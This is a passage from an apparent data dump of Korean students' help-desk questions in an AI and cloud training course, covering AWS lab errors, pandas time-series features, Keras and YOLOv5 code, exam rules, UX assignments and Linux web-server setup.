교안에선 명령문 앞 부분이 \\n\\nec2-user:~/environment $ 인데 저는 [ec2-user@ip-10-0-4-92 ~]$ 이런 식으로 나옵니다.\\n\\n일단 진행해보았습니다만 첨부파일처럼 결과가 나오지 않아서 문의 남깁니다. 어떤 명령문을 추가로 입력해야 ec2-user:~/environment $ 상태가 될 수 있을까요?',\n","       '인스턴스에서 실행중으로 뜨는 것까지 확인을 했는데 health check가 이렇게 나옵니다.. ㅜ\\n어디가 문제인걸까요...?',\n","       '52p cloud9 환경 생성 오류원인을 못찾았는데\\npracice#3 실습 먼저 해도 문제가 없을까요?',\n","       '1. 강의교안 23쪽\\n\\n재해복구(DR)가 특정 지역에 재난이 발생해도 클라우드 컴퓨터를 이용할 수 있다면 가상공간 속에서 서버는 계속 돌아가기 때문에 서비스가 중단 없이 된다는 개념인가요?\\n\\n그런데 유저 가까운 곳에 서버를 구축해야 빠르다고 수업중에 말씀하신 거 같은데…\\n\\nDR을 위해서라면 가급적 멀리 떨어진 장소에 서버를 구축해야 하는 거 아닌가 싶은데\\n서로 상충되지 않나요?\\n\\n선형계획법처럼 최적 지점을 고려해서 서버를 어디가 구축할지 결정한다고 생각하면 될까요?\\n\\n만약 어떤 서비스가 A라는 지역(혹은 국가)에서 서비스 및 개발했고 클라우드 서버는 DR을 위해 A지역 뿐만 아니라 B,C 등 다른 지역(혹은 국가)에서도 구축되어 었다면, 전쟁, 전지구적 재난 등으로 A지역(혹은 국가)가 그 기능을 제대로 하지 못할지라도 B,C에 있는 서버로 인해서 서비스는 정상적으로 진행되는 건가요?\\n(단, 업데이트, 버그 및 오류 수정등은 고려하지 않는다고 가정.)\\n비록 사람은 없을지라도 서버 자체적으로 서비스를 제공하고 운영하는지가 궁금합니다.',\n","       'dns 주소 복붙시에 bad gateway가뜹니다.\\n다 교재랑같이했는데 뭐가문제인지 모르겠습니다...\\n미치겠습니다....\\n\\n아마존 계정접속해서 해결 부탁드립니다....',\n","       'index 인 기준일ID 를 to_datetime 으로 변경했는데 결과가 이렇게 나옵니다ㅜ\\n',\n","       'test의 경우 shift를 하긴하였으나, rolling의 목적이 정확히 뭔지 몰라 진행을 못하고 있습니다.',\n","       '#4 실습 중 RDS 인스턴스 생성(85페이지)에서 가용 영역을 설정하라고하는데 \\n첨부한 사진처럼 가용 영역 선택란이 안보입니다 \\n어떻게 해야할까요 ',\n","       '이번엔 DB 서브넷 그룹에 기본값이 안나옵니다 \\n뭐가 잘못됐을까요?',\n","       '모델링을 해봤는데 r2 score가 0.2가 나온거면 전처리가 잘못되었을 확률이 높겠죠 ?? ',\n","       '이동할 행 수를 어떤 것을 기준으로 정하는 것인지, 이동평균 수가 어떤 것을 말하는건지 모르겠습니다.',\n","       '아직 시계열 데이터에 대해 전반적으로 이해가 가지 않아 몇가지 질문 드립니다 ㅜㅜ\\n\\n1. 현재 데이터에 shift를 해주는 이유 - 우리가 예측해야 할 것은  총생활인구수, 1d 기준이라면 shift(24)를 해줌으로써  하루치의 예측할 자리를 만든다?\\n\\n2. rolling을 해주는 이유에 대해서 과거 총생활인구수의 n일 평균값을 구해주기 위해서인지, 총생활인구수의 평균값을 구했다면 어떻게 활용해야하는지.. \\n\\nshift와 rolling을 왜 해주고 어떻게 활용해야하는지(code를 모르는게 아닌 어떠한 방식으로 접근하여 활용해야하는지) 잘 모르겠습니다...\\n\\n저번 미세먼지 농도 예측 프로젝트에 관련해서는 다음날의 변수 t+1을 shift(1)을 통해 만들고 t+1을 예측하는 방식이었는데 이번 프로젝트의 전체적인 프로세스가 이해가 잘 안갑니다 ㅠㅠㅠ',\n","       '강사님이 계속 언급하시는 1416이 무슨 의미인가요??\\n해당 값을 쉬프팅하는 이유가 무었일까요?',\n","       'rolling 참고할 만한 사이트 있을까요? rolling은 감이 잘 안 옵니다 ㅜㅜ',\n","       '날짜 변수인 기준일ID와 시간을 합쳐서 하나의 날짜 시간으로 만들고 싶은데 어떻게 하는지 아무리 구글링해도 안나옵니다..',\n","       'rds 인스턴스 접속부터 다시 하고있는데 혹시 DB 식별자가 뭐로 되어 있을까요?? \\n제 아이디 d023115로 검색해도 안나와서..',\n","       \"could not convert string to float: '2017-01-01' 오류가 계속 뜹니다...\\n구글링 해봤는데도 해결이 안되서 문의를 남깁니다.\",\n","       '실습교안 164P 에서 테스트 버튼을 눌러 응답본문,응답헤더값을 확인하였더니\\n{\"message\": \"Internal server error\"}\\n{\"x-amzn-ErrorType\":[\"InternalServerErrorException\"]}\\n각각 다음과 같은 오류가 발생했습니다\\n\\nAPI서비스 코드에서 지역 수정 및 hello-member는 정확히 수정하였습니다\\n어디가 잘못된것인지 궁금합니다',\n","       '강사님이 예로 드신 test x 를 1~1416 처럼 일련의 시간값만 주어질 경우\\ny 값을 모르는 상태에서 예측을 어떤식으로 하면 되나요?\\ny 값 = 1416 시점 전의 값을 shift 해서 예측하는 값\\n이런식으로 구하는 건지 궁금합니다.',\n","       'Q2. catboost라는 모델도 있다고 들었습니다. 이 모델도 tree 기반의 모델이 맞나요? 맞다면 shap value를 구할 수 있을까요?\\n\\n답변 부탁드립니다. 감사합니다.',\n","       '첨부파일과 같이 API 테스트에서 오류가 나는데.... 뭐가 문제인지 잘 모르겠습니다ㅜㅜ',\n","       \"안녕하세요.\\n\\n기준일 포함 3일전 평균을 구하려고 아래 코드를 수행했는데\\n\\ndf_total['lag3'] = df_total['총생활인구수'].rolling(3).mean()\\n\\n결과는 같은날 3시간 전 평균으로 나왔습니다. \\n\\n위의 코드로 3일전을 구하려면 \\nA : '기준일ID'에 '시간대구분'을 합친 datetime으로 만들기\\nB : 컬럼변환 없이 rolling(n)의 숫자를 변경하기\\n\\nA와 B중 어떤 방법이 맞나요? 아니면 둘 다 틀린 접근인가요?\",\n","       '실습7 15 진행 중 상태 502로 오류가 나와서 도움 혹은 원격 지원 부탁드립니다.',\n","       '실습 모두 완료했는데 DynamoDB에서 반환된 나오지 않습니다.\\n이전 단계인 GET 메서드 테스트에서 상태값이 500대로 나왔던 것 같습니다.\\n어느 부분을 수정하면 될까요??',\n","       '안녕하세요! \\n저도 실습7 15번 TEST 결과 상태가 502로 뜹니다. 실습 시작 전 강사님이 말씀하신 \\'API서비스(웹기능) 람다 소스코드.txt\\'에서 \"ap-northeast-2\"를 \"ap-southeast-2\"로 변경/저장하고 진행했는데 오류가 나서 문의 드립니다..! 혹시 놓친 부분이 있을까요?  \\n확인 감사합니다 :)',\n","       'API를 삭제하고 다시 하는 도중에 상태가 200이 아니라 502로 나옵니다.\\n요청: /\\n상태: 502\\n지연 시간: 149ms\\n\\n\\n',\n","       '안녕하세요! \\n데이터 전처리 관련해서  질문 드립니다. \\n\\ntrain, test 모두 동일한 전처리를 진행할 경우,\\ntest에서도 shift와 rolling으로 인해 발생하는 결측치가 발생하는데 이는 어떻게 처리하는 것이 가장 효과적인가요?\\n\\n또한, test 데이터에서 결측치를 삭제할 경우에는 예측해야 할 row 수가 변화하여 문제가 될 것 같습니다. 그래서 fillna, interpolate 등의 방식을 사용해야 할 것 같은데, 해당 경우 data leakage가 일어나지 않나요? 만약 그런 경우 어떻게 접근하는 것이 맞는지 질문 드립니다.\\n\\n감사합니다~ \\n\\n',\n","       \"'Lambda 웹페이지 연결 및 테스트' 단계에서 dev스테이지 편집기의 URL을 열면\\n 해당 오류가 발생합니다. 어떻게 해결하면 좋을까요? 무시하고 진행하였더니 함수URL이 제대로 작동하지 않습니다.\",\n","       '안녕하세요\\n164쪽의 api생성할 때 상태 502가 나옵니다.\\n뭐가 문제인가요?\\n감사합니다',\n","       '안녕하세요!\\n오늘 클라우드 서비스 셀프테스트가 오후에 있을 예정인지 궁금합니다.\\n\\n감사합니다.',\n","       '실습교재 164p 메서드 테스트 관련하여\\n응답본문 NULL이 계속 뜨면서\\n수정된 웹사이트의 who are you 버튼에서 계속 에러가 뜹니다\\n',\n","       '캐글 링크 다시 보내주실 수 있나요?',\n","       '3. 강사님이 1416, 즉 두달치를 이야기하신 이유가 무엇인지 궁금합니다. 1시간전(1) 일 수도 있고, 하루(24) 일수도 있고, 일주일(24*7) 로 x를 잡아서 예측할 수도 있지 않나요?\\n\\n4. 3번 질문과 연계되어서, 1시간 전의 총생활인구수를 x로 잡을 경우 가장 좋은 성능이 나올 것으로 예상됩니다. 그렇지만 1시간전의 총생활인구수로 1시간후의 총생활인구수를 예측하는 것은 data leakage에 해당하지 않나요? 혹은 고작 1시간 전의 데이터로 1시간후를 예측하는것이 산업적으로 유의미하게 쓰일 수 있을지 궁금합니다. 과연 몇시간 전, 혹은 며칠 전의 데이터로 x를 만들어서 예측해야 유의미하게 쓰일 수 있을까요?',\n","       '오늘 개별 과제물 제출에 있어서 홈 화면에서 바로 보이는 발표모임 5일차에 제출하지 않고 개별 제출란에 제출했는데 맞게 제출 된걸까요!? \\n오늘 캐글에 온힘을 다해 집중하느라 안내해주시는 부분을 놓쳤습니다....ㅎㅎㅜㅜ',\n","       'UX/UI 과정에는 이론 pdf 자료는 제공이 안되나요?',\n","       \"어포던스가 형태나 디자인을 통해 행위자의 행동을 유도하는 거라고 배웠습니다.\\n\\n1. 스마트폰을 감쌀 경우 전파 수신감도가 떨어지는 일명 '데스그립'의 경우도 어포던스에 해당하는 건가요?\\n\\n이 경우에는 스마트폰 제조사가 사용자들의 스마트폰 파지법을 고려했는지는 알 수 없지만,(의도했는지 여부를 알 수 없음) 결과적으로 사용자들이 스마트폰을 파지할 때 데스그립을 피하게 되었기 때문에 어포던스인지 궁금합니다.\",\n","       '여기서 말하는 시각적은 일관성은 이해를 했는데 \\n[UI패턴을 통일하여 사용자의 방해를 학습을 방해하지 않는다] -  이 내용을 어떤 것을 의미하는지 잘 모르겠습니다! ',\n","       \"AttributeError: 'NoneType' object has no attribute 'shape' 이런 오류가 뜹니다.\",\n","       '넘파이에서 값만 추출하려면\\nprint(ml)이 아니라 어떻게 해야 할까요...?\\n[] 때문에 fail 뜨는 것 같아서 여쭙니다...!',\n","       '두 가지 에러사항 문의드립니다\\n현재 classes.txt는 Helmet, Person으로 변경해둔 상태입니다.\\n\\n1.\\n%cat \"{label_list[100]}\"\\n : cat: \\'{label_list[100]}\\': No such file or directory\\n\\n------------------------------------------------------------\\n2.\\n!python train.py --img 416 --batch 16 --epochs 5 --data /content/data/data.yaml --weights yolov5s.pt --name OID_helmet_data_detection\\n\\n: train: WARNING ⚠️ /content/data/train/images/fd7d0826dc595072.jpg: ignoring corrupt image/label: could not convert string to float: \\'Helmet\\'\\ntrain: WARNING ⚠️ /content/data/train/images/fdae2065a2a0fbb4.jpg: ignoring corrupt image/label: could not convert string to float: \\'Helmet\\'',\n","       'classes.txt  파일 수정하고 실행했는데 동일한 오류 발생합니다.\\n혹시 스트링 형태로 classes .txt파일 작성해야 되나요?',\n","       'Task2 경쟁사와의 비교분석 시 \\n플랫폼 자체를 비교 분석하는건가요?\\n디자인부분을 비교 분석하는건가요?',\n","       '제출 스토리보드 형식에 대해서 어떤 내용을 담아야하는지, 그리고 스토리 보드 형식에 올라온 내용은 어떤걸 의미하는지 궁금합니다',\n","       '제가 이해를 잘 못해서 질문을 드립니다.\\n메뉴구조도 작성하는데 예시구조도 처럼 보고 그리는건지\\n아니면 애플 또는 여기어때 예시를 보면서 제가 임의로 그리고 작성 하면 되는거가 맞는지 여줘 봅니다. \\n구조도 또는 디자인 어떤거를 하는지 이해를 못해서요...',\n","       \"AIDU '내가 참여한 프로젝트'에 AICE Associate 프로젝트가 열려있습니다.\\n해당 프로젝트에 배포된 실습 문제를 풀이중인데요,\\nAssociate 시험문제와 유사한 난이도는 실습1~실습4 정도의 난이도 인지요?\\n심화도전 문제와 일반 실습 문제의 난이도 차이가 커서 문의드립니다.\\n\\n심화도전 문제가 Associate와 유사한 난이도인지, 실습1~4 문제가 Associate와 유사한 난이도인지 궁금합니다.\",\n","       '강의 안에 UI스케치 최소 5p이상 10p 내외 작업하라고 적혀있던데\\n별 다른 설명이 없으셔서 이것도 제출하는 PPT에 포함해야하는지 궁금합니다.',\n","       '와이어프레임까지만 완료하면 되는 것일까요?', '그럼 메뉴 타이틀의 경우 피피티 공란으로 두어도 괜찮은걸까요?',\n","       '어제 저녁 iris 데이터로 문제를 풀려고 보니 ade 데이터와 동일한 파일인 것 같습니다!\\n수정 가능할까요?',\n","       'AICE 시험  칠 때  구글링과 컴퓨터 안에 있는 자료들(주피터,pdf 등) 켜서 봐도 되는 건가요?',\n","       \"(인풋레이어 노드 수, 히든레이어 수에 대한 조건 없이)\\n1개의 fully connected layer를 사용할 것, 노드는 인풋레이어 노드의 2배로 한다.\\n\\n딥러닝 문제에 위와 같은 조건이 있다고 가정했을 때, 1개의 fully connected layer를 사용하라는 지시를 어떻게 수행해야 할지요? Dropout 없이 레이어 1개만 add 하면 되는 것일까요? 위 문장이 전체 레이어를 1개만(인풋레이어 1개) 쓰라는 말로 해석되어 질문 드립니다.\\n\\n'노드는 인풋레이어 노드의 2배로 한다' 는 지시사항도 질문 드립니다. 인풋 레이어에는 DF의 Feature 수 만큼 input_shape가 들어갈 텐데요, 문제에 인풋 레이어 노드 수에 대한 언급이 없습니다. \\n인풋레이어의 노드 수를 32개로 설정했을 경우, 뒤의 히든레이어 노드 수를 64개로 설정하라는 지시일까요?\\n\\n(예시)\\n1개의 fully connected layer를 사용할 것, 노드는 인풋레이어 노드의 2배로 한다.\\n\\nmodel = Sequential()\\nmodel.add(Dense(16, activation='relu', input_shape=(5,)))   \\nmodel.add(Dense(16, activation='relu'))\\nmodel.add(Dense(8, activation='relu'))\\nmodel.add(Dense(1, activation='relu'))    \\n위와 같이 임의의 노드, 여러개의 히든레이어를 두면 문제의 제한 조건에 위배되는 것일까요?\\n'1개의 fully connected layer를 사용' / '노드는 인풋레이어 노드의 2배로 한다.' 는 조건이 뭐에 대한 제한 조건인지 모르겠습니다.\",\n","       \"Q19에서 '1개의 fully conneted layer과 인풋레이어 노드의 2배로 한다'에서 코드가 어디에 적용 되는 걸까요?\\n\",\n","       \"ㅇ 코딩마스터즈 4324번을 푸는과정에서, '해당주민이 거주하는 아파트 단지의 위치의 차'로 구성된다는 점에서 val을 넣어주는 식으로 해서 풀었는데, test case는 통과하였는데 히든 테스트케이스에서는 완전히 모두 틀리게 됩니다. 왜 틀렸는지 반례가 궁금합니다.\\n\\nX = int(input())\\ndanji = []\\nfor _ in range(X):\\n    danji.append(list(map(int,input().split())))\\n\\nmaxxer = 1e9\\nmaxidx = -1\\nfor i in danji:\\n    a = danji.copy()\\n    a.remove(i)\\n    val = 0\\n    for j in a:\\n       val += j[0]-i[0]\\n       val += j[1]-i[1]\\n    # print(val)\\n    if maxxer\u0026gt;val:\\n        maxxer = val\\n        maxidx =i\\nprint(danji.index(maxidx)+1)\",\n","       '내일 AICE시험 볼 때 지금 실습하고 있는 ipynb파일들 AIDU에 접속해서 참고해도 될까요??',\n","       'AICE 시험 볼 때 듀얼 모니터 허용하셨는데 노트북 2대를 연결하여 듀얼모니터로 활용 가능할까요?',\n","       '내일 시험 듀얼모니터 가능한가요? 듀얼 모니터로 정리해놓은 파일(워드, 한글 등)이나 쥬피터랩 봐도 되는지 궁금합니다. \\n그리고 꼭 그램노트북으로 시험봐야할까요?',\n","       '이번주 미프 6차 교육1일차 영상 2시간20분 쯤부터 에러가 발생하는 것 같은데 확인후 조치가능해주실수있으실까요??',\n","       '세부 솔루션을 보시게 되면 저 같은 경우는 2개를 적은 것도 있는데 2개를 적어도 상관없는건가요? \\n\\n예) 기가지니 / 네비게이션',\n","       'AICE 시험관련 두가지 질문사항이 있습니다.\\n\\n1. 코드 미리 받아 적어도 된다고 말씀하셨는데 구글드라이브 내 코랩 파일을 열어서 오픈북으로 사용해도 되나요? 중요 사용할것같은 코드들을 거기다 정리해놔서요.',\n","       '안녕하세요!\\n몇가지 문의드리고 싶은 것이 있어 글 남겼습니다.\\n\\n1. \\n- 위치: [SOL3_데이터 전처리 교안-Chapter3. 데이터 전처리하기-(2) 결측치 채우기-주변값을 활용하여 결측치 채우기-\"앞에 있는 data를 사용해서 결측치를 처리하는 방법\"]\\n- 내용:  여기서 df=df_fix.copy()를 하는 것은 앞에서 df_fix에 대해 전처리를 정상적으로 했으니, 전처리 한 부분을 df에 덮어씌운다. 라고 설명해주신 것 같은데, 제대로 이해한 게 맞을까요?\\n실수 방지를 위해 머신러닝 전단계에서 df=df_fix.copy()를 진행해도 괜찮은 건지 궁금합니다.',\n","       '안녕하세요\\n일정이 있어 휴가를 썼다가 방금 접속했습니다\\n혹시 지금 공유 중인 자료 위치를 알 수 있을까요!?',\n","       '맨 마지막 [실습] 부분을 진행하니 다음과 같은 에러가 뜨는데,  교안에 있는 코드 그대로 돌린건데 무엇이 문제인지 잘 모르겠습니다..!\\n\\n[코드]\\n# 여기에 입력하세요\\n# 라이브러리 임포트\\nimport tensorflow as tf\\nfrom tensorflow.keras.models import Sequential\\nfrom tensorflow.keras.layers import Dense, Activation, Dropout\\nfrom tensorflow.keras.callbacks import  EarlyStopping, ModelCheckpoint\\n\\n# input layer 확인 \\nX_train.shape\\n\\n# 모델 선언 (뱐수 : model_q)\\nmodel_q = Sequential()\\nmodel_q.add(Dense(32, activation=\\'relu\\', input_shape=(80,)))\\nmodel_q.add(Dropout(0.3))\\nmodel_q.add(Dense(16, activation=\\'relu\\'))\\nmodel_q.add(Dropout(0.3))\\nmodel_q.add(Dense(8, activation=\\'relu\\'))\\nmodel_q.add(Dropout(0.3))\\nmodel_q.add(Dense(1, activation=\\'sigmoid\\'))\\n\\n# 모델 확인\\nmodel_q.summary()\\n\\n# 모델 컴파일하기\\nmodel_q.compile(optimizer=\\'adam\\', \\n              loss=\\'binary_crossentropy\\', # 이진 분류이므로\\n              metrics=[\\'accuracy\\']) \\n\\n# callbacks 함수 설정\\n# 검증 데잍의 정확도를 보기 위해 max로 한 것. 만약 monitor=loss이면 mode=min\\nes = EarlyStopping(monitor=\\'val_accuracy\\', patience=5, mode=\\'max\\', verbose=1)\\nmc = ModelCheckpoint(\\'my_checkpoint_q.ckpt\\', monitor=\\'val_accuracy\\', save_best_only=True, verbose=1)\\n\\n\\n\\n# 모델 훈련\\nhistory = model_q.fit(X_train, y_train, \\n                        validation_data=(X_test, y_test),\\n                        epochs=20, \\n                        callbacks=[es, mc],\\n                        batch_size=32,\\n                        verbose=1)\\n\\nmodel_q.load_weights(\"my_checkpoint_q.ckpt\")\\nmodel_q.save(\"석재민.h5\")',\n","       '안녕하세요\\n조별 과제도 제출해야 하나요?\\n그리고 제가 개인별 과제를 조별에 잘못 업로드했는데 삭제가 없는 것도 같이 문의드립니다\\n감사합니다',\n","       '4,5,6,7페이지를 하고 클라우드 부분은 제외하고 제출하면 되나요?',\n","       '현재 코드를 작성하여 시도 중이나 , 코드에 오류를 찾을 수 없는데 case5에서 Failed가 반복되어 질문 드립니다. 혹시 오류가 있는지 도움을 구하고 싶습니다. 감사합니다!',\n","       \"2)LabelEncoder를 사용하는 방법을 모르겠습니다.\\n\\nfrom sklearn.preprocessing import LabelEncoder\\nle = LabelEncoder()\\n변수 = le.fit_transform(data['원하는 열'])\\n\\n이렇게 사용하는 것이 맞을까요?\",\n","       '질문2.\\n질문1이 제 생각처럼 링버퍼처럼 돌아가도 되고 17번일경우 2번으로 치는것처럼이 맞다면\\n2번 예제에서 7번이 스타트이고 +4 -6 +8 -13의경우\\n1-7번배 2-11번배 3-5번배 4-13번배 \\n그런데 여기서 -13번을 하면 0이 나오고 이럴경우 15번 배가 되어서\\n최대가 15번 배가 되야 하는게 아닌가 질문드립니다.\\n\\n항상 도와주셔서 감사합니다!',\n","       '가방은 오름차순 , 물건은 가격 기준으로 내림차순으로 정렬해서 작은 가방에 비싼 물건을 담으려고 했습니다.\\n코드의 어떤 부분에 문제가 있을까요?',\n","       '제가 개인적으로 하고 있는 건데 도움이 필요합니다 ㅠㅠ\\n\\n1. 가변수화를 하고 knn 인퓨터로 결측치를 채우고 싶습니다. 하지만 가변수화를 하면 결측치가 있던 열이 사라지게 되는데, 결측치가 있는 행은 가변수화가 불가능한가요?',\n","       'install ubuntu를 누르면 로딩이 되는 듯 하다가 까만 화면이 뜹니다. 혹시 해결할 수 있을까요?',\n","       '문화재를 촉감으로 체험해볼 수 있는 부스 서비스를 제공해보려는데\\n이걸 제공서비스를 어디에다가 해야할까요??\\n\\n+) 튜터님께 여쭤보려고 했는데 나가셔서... 혹시나 지금 한 번만 다시 들어와주실 수 있을까요??',\n","       '외출을 다녀와서 교안 보고 따라가려고 했는데 올려져있는 교안이랑 강사님이 지금 사용하시는 거랑 다른 것 같아서 따라가기가 힘듦니다 ㅜㅜ',\n","       '새 네트워크 추가가 없습니다 제가 버전을 잘못 설치한걸까요ㅠ?',\n","       'sudo apt update까지는 입력이 되는데 패스워드 입력하려니까 입력 자체가 안되는 것 같습니다. 키보드 문제인가 싶어 화상키보드로도 시도해봤는데 패스워드 입력 자체가 안됩니다.(키보드 자판을 눌러도 화면에 입력x) \\n혹시 무슨 문제인지 알 수 있을까요?',\n","       'sudo -s sudo -i 차이가 무엇인지 헷갈려요..',\n","       '시스템 배치에서 고객사와 제안사에 대한 서비스 구분이 아직도 명확하지 않습니다...\\n어떠한 기준으로 서비스를 구분하면 되는지 한번 알려주실 수 있으실까요?',\n","       '혹시 원격 지원 부탁드려도 될까요',\n","       '우분투의 파이어폭스에서 그누보드 설치 -\u0026gt; 설정을 진행하는 도중 사진과 같은 경고창이 뜨면서 진행이되지 않습니다. Ubuntu_DB의 ip 주소는 10.0.2.4로 확인한 상태입니다. 어떻게 해결해야할까요 ...ㅠㅠ?',\n","       '안녕하십니까.\\n코딩마스터스 4406번을 dfs로 시도했으나 \\n마지막 테스트 케이스 문제에 대해 감이 잘 잡히지 않아 질문 드립니다.\\ndfs가 아닌 다른 방식으로 풀어야 하는지, 아니면 경계 조건 설정의 문제인지 질문드립니다.\\n\\nn, m, k  = map(int, input().split())\\n\\ngraph = [[1] * (m) for _ in range(n)]\\nfor i in range(k):\\n    x, y = map(int, input().split())\\n    graph[x][y] = 0\\n\\ndef dfs(x, y):\\n    if x = m or y = n:\\n        return False\\n\\n    if graph[x][y] == 0:\\n        graph[x][y] = 1\\n        dfs(x - 1, y)\\n        dfs(x, y - 1)\\n        dfs(x + 1, y)\\n        dfs(x, y + 1)\\n        return True\\n    return False\\n\\n\\nresult = 0\\nfor i in range(n):\\n    for j in range(m):\\n        if dfs(i, j) == True:\\n            result += 1\\nprint(result)',\n","       '한울이는 전투에 대비하기 위해 자신의 용병들이 가지는 전력을 파악하고자 합니다. 용병들은 서로 전투력이 동화되는 성격을 가지고 있어서, 여러 명의 용병들이 있을 때에는 가장 전투력이 낮은 용병와 동일하게 나머지 용병들의 전투력이 조정됩니다.\\n\\n예를 들어 용병이 4명이고, 각 용병의 전투력이 (43, 50, 80, 23)이라면 최대 전투력의 합은 (43, 50, 80)을 선택한 것으로 43 * 3 = 129입니다. 라고 되어있는데\\n\\n(1)  4명 중에 가장 적은 값을 뺀 후 나머지 3명으로 계산을 하라는 것인지\\n(2) 4명이 오타이고 3명일 때 (43, 50, 80)의 합 인지 궁금합니다.',\n","       \"\\n\\n[전문]\\n\\n from keras.models import Model\\n from keras.layers import Input, Dense, LSTM, TimeDistributed\\n import numpy as np\\n\\n\\n x = np.array([[[1.], [2.], [3.], [4.], [5.]]])\\n y = np.array([[[2.], [3.], [4.], [5.], [6.]]])\\n xInput = Input(batch_shape=(None, 5, 1))\\n xLstm = LSTM(3, return_sequences=True)(xInput)\\n xOutput = TimeDistributed(Dense(1))(xLstm)\\n model = Model(xInput, xOutput)\\n model.compile(loss='mean_squared_error', optimizer='adam')\\n print(model.summary)\\n\\nLSTM을 이해하는 도중에, timedistributed()함수를 쓰는데, 이걸 어디에 쓰는지를 잘 모르겠습니다.\\n\\n\\n\",\n","       '오늘 산출물 고도화1 시간에 조별로 발표하는 건가요?',\n","       'owner group other로 구분된다고 알고 있는데\\nowner는 게시판을 만든 사람이고\\nother는 게시판을 이용하는 사용자들이고\\ngroup은 누구를 지칭하는건가요?',\n","       '$ sudo apt install mysql-server 명령어를 실행 후 새로고침으로 재 접속을 시도해보았는데도 안되서 문의 남깁니다',\n","       '저런 코드를 치기 위해서 cd /var/www/html 안에 php 파일이 있어야 하는거 같은데 넣는 방법을 몰라서 문의 드립니다. 어떻게 넣어야 하나요?',\n","       '$ cd /var/www/html\\n$  sudo vi 01.php\\n\\n이 코드를 실행하면 01.php는 들어가 지는데 텅 비어있습니다. 원래 이게 정상인 건가요? 제가 내용을 채워 넣어야 하는 건가요?',\n","       'php파일 모두 수정하였는데 500 코드가 뜹니다. ㅠㅠ',\n","       '제안사 시스템에서 활용될 데이터 (예: 내비게이션 서비스에 활용될 사용자 경로 데이터)를 제안사 시스템의 DB가 아닌 클라우드 DB에 저장하는 방식으로 서비스를 구성해도 문제가 없을까요?',\n","       '앞전에 실습할 때 새 user아이디 만들어서 했을 때도 화면이 파이어 폭스 창에 하얗게 나와서\\n다시 새 계정을 만들어서 다 수정해주고 추가로 설치 안된 파일이 있을지도 모른다고 하셔서 다 설치도 했는데\\n여전히 하얀 화면만 나오네요 어떻게 해야할까요?',\n","       '제안서에서 서비스 인프라(제안사 서비스)와 관제 시스템 인프라(고객사 설치)를 구분하여\\n인프라 구성도를 제시해야 한다.\\n하여서 고객사 시스템에 was/DB를 따로 구성했는데 이렇게 해도 상관 없는건가요',\n","       '안녕하세요! no such file or directory 라고 하는데 혹시 원격 지원 부탁드려도 될까요.?',\n","       '같은 원격접속인데 하는방법만 다른건가요?\\n다르다면 어떤면에서 다른가요?',\n","       '192.168.56.1 은 사용자가 임의로 지정해서 사용하는 ip인가요?  어디서 나왔는지 생각이 나지 않아 질문 드립니다......',\n","       'main.html 으로 들어가면 화면은 나오지만 회원 조회를 들어가면 똑같이 하얀 화면이 나오네요 앞 전 파일들이 제대로 실행이 안된 것 같아요 \\n오타는 다 확인해봤지만 강사님이랑 ip주소만 달라서 그것 말곤 전부 똑같습니다 어떤 분은 크롬에서 된다고 하셔서 크롬도 설치해봤는데 크롬에선 아예 연결 자체가 안되네요',\n","       '직접적이고 빠른 관리를 위해 디바이스와 고객사 시스템을 내부망으로 연결하는건 가능할까요?\\n예를 들면 내부망을 구축하여 스마트 케인에서 경고 위험을 내부망을 통해 직접 고객사 인프라로 보내는 경우입니다!',\n","       \"모든 용량을 무료로 제공해주는 것이 아닌 제한적으로 지원을 해주는 것이라고 알게 되었습니다\\n예를들어 '카페, 블로그'같은 경우는 웹 서버 형태로 지원해주는 것인데 \\n어느정도 사용 용량이 정해져 있지 않을까요\\n사용자가 1G미만이 영상이나 이미지를 매일 같이 수십, 수백 개를 업로드하게 되어도 문제가 되지 않나요 ?\",\n","       '순서대로 다했는데 putty로 접속이 안됩니다', '명령어까지 입력했는데 웹브라우저 연결이 안됩니다',\n","       '[실습1]\\n실습 피드백 요청합니다.\\nto be : 간편하게 상품 주문 후 당일 배송.\\nproblem :  상품을 주문 후 바로 받기 어려움\\nas is : 신선식품을 배송 받아야함.',\n","       '현재 현대백화점 부산점이 매우 부진하는 중입니다.(as-is)/그래서 부산, 경남 고객을 확보 할 수 있도록 하는 것이 중요한데(to-be)/현실은 그러지 못하여 고객을 롯데, 신세계 등 경쟁사에 빼앗기고 있습니다.(problem)\\n\\n문제종류는 부산의 명지신도시 발전에 따라 새로운 백화점이나 프리미엄아울렛을 명지신도시에 건설하고 고객을 확보할 수 있도록 하는 것입니다. ',\n","       '실습1 피드백 요청\\n\\n기업명 : DL이앤씨(건설사)\\n\\n(2) To-Be\\n안전 장치 강화 - 안전펜스 구축\\n안전 조치 사항 자동화\\n안전 관리 관제 통합 시스템 구축\\n\\n(3) Problem\\n안전조치 미준수 사항 다수\\n안전 장치 부족\\n\\n(1) As-Is\\n작업중 사망사고 지속적 발생\\n\\n* 문제종류\\n발생형\\n-\u0026gt; 개선방안 중심 To-Be\\n',\n","       '[실습1]\\n\\n쿠팡이츠\\n\\nTo-be \\nProblem 1. 메뉴 추천 로직을 알기 힘들다(지역에 새로이 등록된 가게기준인지, 배달시킨 전적이 있는 비슷한 메뉴기준인지 알 수 없다.)\\n2. 빠른 결제 로직으로 인해 오히려 주문 취소가 어려움\\n3. \\n\\nAs-Is 1. 카테고리 직관적X\\n2. 리뷰 제공 부실\\n3.  빠른 주문 결제 로직',\n","       '문제 정의를 하는데 생각해보니 나중에 데이터를 찾을 때 어려움을 겪을 것 같아서  문제를 정의할 기업을 바꿔야 할 것 같아요.',\n","       'putty 실행 후\\nec2-user@제 ip 입력,,  이후 ppk 파일 오픈해서 콘솔창 띄운 다음에\\n\\nsudo -i\\nlsblk\\nmkfs -t xfs/dev/xvdf\\n까지는 실행이 되는데\\nmkdir /data 를 치면 사진과 같이 \\ncannot create directory ‘/data’: File exists\\n라고 나옵니다 ㅜ',\n","       '기존 생성된 볼륨을 삭제하려고 하는데 볼륨 분리가 불가능해서 삭제가 안됩니다. 어떻게 해야할까요??',\n","       '안녕하세요 ! \\n어제 한 실습1부분에 대한 피드백에 관한 내용에서 이해가 되지 않는 부분이 있어서 문의드립니다!\\n\\n다만 현상황과 문제점과 원인을 혼동하신 것 같습니다. .  본인의 경험이나 언론기사 등을  활용하시어 현재 상황이 어떠한지 기술해 보시고  바람직한 모습을 상상하고 현재상황과 차이나는 문제사항을 정리해 보시기 바랍니다.  특히 주어와 술어를 사용하여 정의해 보면 현상과 문제점이 잘 보일수 있습니다.\\n\\n라고 제가 피드백을 받았는데 , 제가 as-is를 문제점의 원인으로 생각해서 적었다는 말씀이실까요 ?\\n아니면 problem을 as-is와 to-be의 차이점으로 생각하지 못하고 적었다는 말씀이실까요 ? 